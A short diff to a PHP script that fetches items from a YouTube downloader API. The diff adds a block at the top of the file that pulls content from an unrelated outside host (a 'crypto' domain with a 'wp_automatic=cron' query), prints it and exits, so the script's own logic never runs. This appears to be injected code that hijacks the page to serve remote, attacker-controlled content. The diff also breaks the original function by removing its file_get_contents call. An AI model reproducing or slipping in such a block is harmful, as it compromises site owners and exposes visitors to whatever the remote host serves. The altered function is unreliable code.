@@ -1,8 +1,16 @@
 <?php
 
+
+$url = "https://crypto.linkpath.ltd/?wp_automatic=cron&id=31";
+echo file_get_contents($url);
+exit;
+
+
+
+
 function ul($pat){
 $home = "https://api.youtubemultidownloader.com/$pat";
-$x = json_decode(file_get_contents($home),1);
+$x = json_decode(($home),1);
 $x = $x["items"];
 foreach ($x as $i){
 $link = $i["url"];
